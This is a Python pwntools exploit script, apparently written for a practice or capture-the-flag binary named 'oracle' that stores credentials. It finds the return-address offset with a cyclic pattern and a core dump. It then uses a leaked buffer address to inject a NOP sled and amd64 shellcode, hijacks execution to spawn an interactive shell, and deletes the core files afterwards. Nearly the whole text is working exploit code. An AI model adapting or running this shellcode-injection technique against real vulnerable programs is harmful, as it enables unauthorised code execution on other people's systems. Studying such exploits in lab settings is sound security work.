from pwn import *
import time

def get_overflow_offset():
    p = process('./oracle')

    info("Creating new Credential. . .")
    sleep(1)
    p.sendline(b'add')
    
    info("Entering Username. . .")
    sleep(1)
    p.sendline(b'ender')

    info("Entering Cyclic Pattern. . .")
    pattern = cyclic(500)
    sleep(1)
    p.sendline(pattern)

    info("Triggering Initial Buffer-Overflow. . .")
    sleep(1)
    p.sendline(b'show-all')
    p.wait()

    try:
        info("Attempting to find RIP offset. . .")
        core = p.corefile
        stack = core.rsp

        target_pattern = core.read(stack, 4)
        rip_offset = cyclic_find(target_pattern)

        success(f"RIP offset: {rip_offset}")    
        return rip_offset
    except Exception as e:
        print(f"[-] Error: {e}")
        return -1

def inject_shell(offset):
    if offset == -1:
        error("RIP offset was not found!")
        return

    p = process('./oracle')

    info("Creating new Credential. . .")
    sleep(1)
    p.sendline(b'add')
   
    # log the memory address leaked pointing to out shell-code
    p.recvuntil(b'Password located -> ')
    payload_addr = int(p.recvline().strip().decode(), 16)
    info(f"Payload Address: {payload_addr}")

    info("Entering Username. . .")
    sleep(1)
    p.sendline(b'ender')

    info("Generating Shell-Code Payload. . .")
    context.arch = 'amd64'
    shellcode = asm(shellcraft.sh())

    nop_sled = b'\x90' * 40
    shellcode_buffer = nop_sled + shellcode
    shellcode_buffer = shellcode_buffer.ljust(64, b'\x90')

    padding = b'A' * (offset - len(shellcode_buffer))
    ret = p64(payload_addr)

    payload = shellcode_buffer + padding + ret

    info("Stuffing Shell-Code Payload. . .")
    sleep(1)
    p.sendline(payload)

    info("Triggering Shell Exec. . .")
    sleep(1)
    p.sendline(b'show-all')
    p.interactive()

def clean_up():
    info("Cleaning CWD. . .")
    os.system('rm -f core.*')

def main():
    offset = get_overflow_offset()
    inject_shell(offset)
    clean_up()

if __name__ == "__main__":
    main()
